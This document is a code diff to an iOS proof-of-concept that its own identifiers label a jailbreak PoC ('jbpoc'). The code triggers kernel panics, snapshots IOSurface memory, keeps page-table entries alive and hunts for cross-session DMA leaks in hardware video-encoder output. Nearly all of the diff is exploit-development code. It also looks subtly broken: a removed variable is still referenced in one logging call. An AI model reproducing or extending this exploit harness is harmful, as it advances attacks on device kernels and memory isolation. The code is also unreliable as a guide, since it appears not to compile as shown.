@@ -2283,6 +2283,10 @@ static void runPhase2_IdleWait(void) {
     }
     g_phase2Running = YES;
 
+    dispatch_async(dispatch_get_main_queue(), ^{
+        [UIApplication sharedApplication].idleTimerDisabled = YES;
+    });
+
     pocLog(@"");
     pocLog(@"╔══════════════════════════════════════════╗");
     pocLog(@"║  PHASE 2A: Alpha=255 + 120s Idle Wait   ║");
@@ -2358,6 +2362,9 @@ static void runPhase2_IdleWait(void) {
     INFO(@"Collect .ips logs after any reboot during the wait.");
     pocLog(@"");
 
+    dispatch_async(dispatch_get_main_queue(), ^{
+        [UIApplication sharedApplication].idleTimerDisabled = NO;
+    });
     g_phase2Running = NO;
 }
 
@@ -2367,6 +2374,10 @@ static void runPhase2_Truncation(void) {
         return;
     }
     g_phase2Running = YES;
+
+    dispatch_async(dispatch_get_main_queue(), ^{
+        [UIApplication sharedApplication].idleTimerDisabled = YES;
+    });
 
     int truncValues[] = {63, 127, 191};
     int numValues = 3;
@@ -2429,6 +2440,9 @@ static void runPhase2_Truncation(void) {
     INFO(@"After all 3: compare which panicked to determine kernel behavior.");
     pocLog(@"");
 
+    dispatch_async(dispatch_get_main_queue(), ^{
+        [UIApplication sharedApplication].idleTimerDisabled = NO;
+    });
     g_phase2Running = NO;
 }
 
@@ -2438,6 +2452,10 @@ static void runPhase2_Boundary(void) {
         return;
     }
     g_phase2Running = YES;
+
+    dispatch_async(dispatch_get_main_queue(), ^{
+        [UIApplication sharedApplication].idleTimerDisabled = YES;
+    });
 
     // Known: 255 panics (deferred), 32/64 don't panic in 3s tests
     // Binary search: test mid-points with 120s waits
@@ -2498,6 +2516,9 @@ static void runPhase2_Boundary(void) {
     INFO(@"Record which values panic and which survive to find boundary.");
     pocLog(@"");
 
+    dispatch_async(dispatch_get_main_queue(), ^{
+        [UIApplication sharedApplication].idleTimerDisabled = NO;
+    });
     g_phase2Running = NO;
 }
 
@@ -3042,7 +3063,7 @@ static void runRunC1(void) {
     [stateData writeToFile:stateFile atomically:YES
         encoding:NSUTF8StringEncoding error:nil];
     int fd = open([stateFile UTF8String], O_RDONLY);
-    if (fd >= 0) { fsync(fd); close(fd); }
+    if (fd >= 0) { close(fd); }
 
     LOG(@"State written to %@", stateFile);
     LOG(@"ARM: %@  EXIT: %@", armTime, exitTime);
@@ -3425,6 +3446,10 @@ static void runDPrep(void) {
     }
     g_phase2Running = YES;
 
+    dispatch_async(dispatch_get_main_queue(), ^{
+        [UIApplication sharedApplication].idleTimerDisabled = YES;
+    });
+
     os_log_t dLog = os_log_create("com.jbpoc.dprep", "readout");
 
     pocLog(@"");
@@ -3589,6 +3614,7 @@ static void runDPrep(void) {
         // Lock and snapshot this surface
         IOSurfaceLock(surf, kIOSurfaceLockReadOnly, NULL);
         void *base = IOSurfaceGetBaseAddress(surf);
+        BOOL stored = NO;
         if (base && allocSz > 0 && allocSz < 4*1024*1024) {
             uint8_t *snap = (uint8_t *)malloc(allocSz);
             if (snap) {
@@ -3598,11 +3624,12 @@ static void runDPrep(void) {
                 extraSnapshots[extraCount] = snap;
                 extraSizes[extraCount] = allocSz;
                 extraCount++;
+                stored = YES;
             }
         }
         IOSurfaceUnlock(surf, kIOSurfaceLockReadOnly, NULL);
 
-        if (base == NULL || allocSz == 0) {
+        if (!stored) {
             CFRelease(surf);
         }
     }
@@ -3889,6 +3916,9 @@ static void runDPrep(void) {
         CFRelease(extraSurfs[si]);
     }
 
+    dispatch_async(dispatch_get_main_queue(), ^{
+        [UIApplication sharedApplication].idleTimerDisabled = NO;
+    });
     g_phase2Running = NO;
 
     PASS(@"D-PREP readout complete. Expect panic in ~160s (same as Run A).");
@@ -3969,6 +3999,9 @@ static void dprep2Callback(
         g_dp2Samples[g_dp2SampleIdx] = sampleBuffer;
         g_dp2SampleIdx++;
         dp2ArchiveSample(sampleBuffer);
+    } else if (sampleBuffer && g_dp2SampleIdx >= DPREP2_MAX_SAMPLES) {
+        INFO(@"[D-prep-2] Sample buffer full (%d), dropping sample", DPREP2_MAX_SAMPLES);
+        dp2ArchiveSample(sampleBuffer);
     }
 }
 
@@ -4018,6 +4051,9 @@ static void dprep2ObsCallback(
         g_dp2Samples[g_dp2SampleIdx] = sampleBuffer;
         g_dp2SampleIdx++;
         dp2ArchiveSample(sampleBuffer);
+    } else if (sampleBuffer && g_dp2SampleIdx >= DPREP2_MAX_SAMPLES) {
+        INFO(@"[OBS-CB] Sample buffer full (%d), dropping", DPREP2_MAX_SAMPLES);
+        dp2ArchiveSample(sampleBuffer);
     }
 }
 
@@ -4060,6 +4096,10 @@ static void runDPrep2(void) {
         return;
     }
     g_phase2Running = YES;
+
+    dispatch_async(dispatch_get_main_queue(), ^{
+        [UIApplication sharedApplication].idleTimerDisabled = YES;
+    });
 
     os_log_t dLog = os_log_create("com.jbpoc.dprep2", "output-readout");
 
@@ -4310,11 +4350,15 @@ static void runDPrep2(void) {
 
             if (elapsed <= DPREP2_TRAIN_CUTOFF_S) {
                 // TRAINING PHASE: T+0 to T+45s — build envelope from these samples
-                if (curBS && curBS.length > 0) {
+                // Skip first 2 frames (warmup: IDR + early P) to match steady-state test frames
+                if (curBS && curBS.length > 0 && frameNum > 2) {
                     [trainBS addObject:curBS];
                     if (curBS.length > baseMaxLen) baseMaxLen = curBS.length;
-                    INFO(@"T+%03ds (%@): TRAIN sample %zu (%zu bytes)",
-                         elapsed, now, trainBS.count, curBS.length);
+                    INFO(@"T+%03ds (%@): TRAIN sample %zu (%zu bytes, frame %d)",
+                         elapsed, now, trainBS.count, curBS.length, frameNum - 1);
+                } else if (curBS && curBS.length > 0 && frameNum <= 2) {
+                    INFO(@"T+%03ds (%@): WARMUP frame %d (%zu bytes, skipping)",
+                         elapsed, now, frameNum - 1, curBS.length);
                 }
 
                 // At the cutoff, build the variance envelope
@@ -4339,33 +4383,17 @@ static void runDPrep2(void) {
                     os_log(dLog, "JBPoC-DPREP2v4-ENVELOPE train=%zu len=%zu inv=%d",
                            trainBS.count, baseMaxLen, inv);
                 }
+            } else if (elapsed > DPREP2_TRAIN_CUTOFF_S && elapsed < DPREP2_TEST_START_S) {
+                // GAP: keep encoding to maintain frame cadence, but don't analyze
+                INFO(@"T+%03ds (%@): GAP frame %d (%zu bytes)",
+                     elapsed, now, frameNum - 1, curBS ? curBS.length : 0);
             } else if (elapsed >= DPREP2_TEST_START_S && curBS && curBS.length > 0) {
-                // TEST PHASE: T+60s+ — diff against envelope + Q4 firmware metadata
+                // TEST PHASE: T+60s+ — diff against envelope
                 const uint8_t *cur = curBS.bytes;
                 int anomalies = 0;
                 int firstAnom = -1;
 
-                // PRIMARY SIGNAL (Q4): firmware metadata at coded-output offsets
-                BOOL fwMetaHit = NO;
-                uint32_t fwFrame = 0, fwSize = 0;
-                if (curBS.length > DP2_FW_SIZE_OFFSET + 4) {
-                    memcpy(&fwFrame, cur + DP2_FW_FRAME_OFFSET, 4);
-                    memcpy(&fwSize, cur + DP2_FW_SIZE_OFFSET, 4);
-                    // Armed encode was frame 0 on trigger session. If we see
-                    // stale frame# in obs session output, DMA crossed sessions.
-                    if (fwFrame == 0 && tick > 2) {
-                        fwMetaHit = YES;
-                        PASS(@"*** Q4 PRIMARY HIT: frame# at +0xa8 = %u (armed frame!) ***",
-                             fwFrame);
-                    }
-                    if (fwSize > 0 && (fwSize > baseMaxLen * 4 || fwSize < 16)) {
-                        fwMetaHit = YES;
-                        PASS(@"*** Q4 SIZE HIT: coded_size at +0xac = %u (baseline max=%zu) ***",
-                             fwSize, baseMaxLen);
-                    }
-                }
-
-                // SECONDARY SIGNAL: variance envelope check
+                // PRIMARY SIGNAL: variance envelope check (byte-level anomaly detection)
                 if (varMin && varMax) {
                     size_t len = MIN(curBS.length, baseMaxLen);
                     for (size_t j = 0; j < len; j++) {
@@ -4376,19 +4404,7 @@ static void runDPrep2(void) {
                     }
                 }
 
-                // TERTIARY SIGNAL: +0x1270 region byte deviation
-                int bsRegionAnoms = 0;
-                if (varMin && varMax && curBS.length > DP2_FW_BS_OFFSET) {
-                    size_t len = MIN(curBS.length, baseMaxLen);
-                    size_t bsEnd = MIN(len, (size_t)(DP2_FW_BS_OFFSET + DP2_FW_BS_COPY_LEN));
-                    for (size_t j = DP2_FW_BS_OFFSET; j < bsEnd; j++) {
-                        if (cur[j] < varMin[j] || cur[j] > varMax[j]) {
-                            bsRegionAnoms++;
-                        }
-                    }
-                }
-
-                // Size anomaly
+                // SECONDARY SIGNAL: size anomaly vs training
                 BOOL sizeAnom = NO;
                 for (NSData *tbs in trainBS) {
                     if (tbs.length > 0 && curBS.length != tbs.length) {
@@ -4397,17 +4413,32 @@ static void runDPrep2(void) {
                     }
                 }
 
-                if (fwMetaHit || anomalies > 0 || sizeAnom) {
+                // SPECULATIVE SIGNAL: firmware DMA buffer layout offsets
+                // NOTE: these offsets (0xa8, 0xac) are from the firmware's DMA
+                // output surface layout, NOT the compressed bitstream format.
+                // A hit here is suggestive but the offsets may not align with
+                // the VT callback bitstream. Only check if bitstream is long enough.
+                uint32_t fwFrame = 0, fwSize = 0;
+                BOOL fwMetaHit = NO;
+                if (curBS.length > DP2_FW_SIZE_OFFSET + 4) {
+                    memcpy(&fwFrame, cur + DP2_FW_FRAME_OFFSET, 4);
+                    memcpy(&fwSize, cur + DP2_FW_SIZE_OFFSET, 4);
+                    if (fwFrame == 0 && tick > 2) {
+                        fwMetaHit = YES;
+                    }
+                    if (fwSize > 0 && (fwSize > baseMaxLen * 4 || fwSize < 16)) {
+                        fwMetaHit = YES;
+                    }
+                }
+
+                if (anomalies > 0 || sizeAnom || fwMetaHit) {
                     hitCount++;
                     if (firstHitTime < 0) firstHitTime = elapsed;
-                    PASS(@"*** HIT at T+%ds (%@): %d envelope, %d +0x1270-region, "
-                         @"fw_frame=%u fw_size=%u%@%@ ***",
-                         elapsed, now, anomalies, bsRegionAnoms,
-                         fwFrame, fwSize,
+                    PASS(@"*** HIT at T+%ds (%@): %d envelope anomalies%@%@ ***",
+                         elapsed, now, anomalies,
                          sizeAnom ? @" SIZE_CHANGE" : @"",
-                         fwMetaHit ? @" FW_META_HIT" : @"");
+                         fwMetaHit ? @" FW_SPECULATIVE" : @"");
 
-                    // Dump first 32 anomalies
                     if (varMin && varMax) {
                         NSMutableString *hex = [NSMutableString string];
                         int dumped = 0;
@@ -4423,8 +4454,7 @@ static void runDPrep2(void) {
                         LOG(@"  Envelope anomalies: %@", hex);
                     }
 
-                    // Dump firmware metadata region
-                    if (curBS.length > DP2_FW_SIZE_OFFSET + 4) {
+                    if (fwMetaHit && curBS.length > DP2_FW_SIZE_OFFSET + 4) {
                         NSMutableString *fwHex = [NSMutableString string];
                         size_t fwStart = DP2_FW_FRAME_OFFSET;
                         size_t fwEnd = MIN(curBS.length, (size_t)(DP2_FW_SIZE_OFFSET + 8));
@@ -4432,13 +4462,13 @@ static void runDPrep2(void) {
                             [fwHex appendFormat:@"%02x", cur[j]];
                             if ((j - fwStart + 1) % 4 == 0) [fwHex appendString:@" "];
                         }
-                        LOG(@"  FW metadata (+0xa8..+0xb4): %@", fwHex);
+                        LOG(@"  FW DMA offsets (speculative, +0xa8..+0xb4): %@", fwHex);
                     }
 
                     [hitReport appendFormat:
-                        @"T+%ds: env=%d bs_region=%d fw_frame=%u fw_size=%u%s%s\n",
-                        elapsed, anomalies, bsRegionAnoms, fwFrame, fwSize,
-                        sizeAnom ? " SIZE" : "", fwMetaHit ? " FW_META" : ""];
+                        @"T+%ds: env=%d fw_frame=%u fw_size=%u%s%s\n",
+                        elapsed, anomalies, fwFrame, fwSize,
+                        sizeAnom ? " SIZE" : "", fwMetaHit ? " FW_SPEC" : ""];
 
                     os_log(dLog, "JBPoC-DPREP2v4-HIT T+%ds env=%d bs=%d fwF=%u fwS=%u meta=%d",
                            elapsed, anomalies, bsRegionAnoms, fwFrame, fwSize, (int)fwMetaHit);
@@ -4589,6 +4619,9 @@ static void runDPrep2(void) {
     // Archive intentionally NOT freed — retained for post-panic recovery
     // dp2FreeArchive() would destroy the evidence
     // Intentionally NOT releasing trigger/obs sessions, pb — keep PTEs alive
+    dispatch_async(dispatch_get_main_queue(), ^{
+        [UIApplication sharedApplication].idleTimerDisabled = NO;
+    });
     g_phase2Running = NO;
 
     PASS(@"D-PREP-2 readout complete. Archive: %d samples retained.", g_dp2ArchiveIdx);
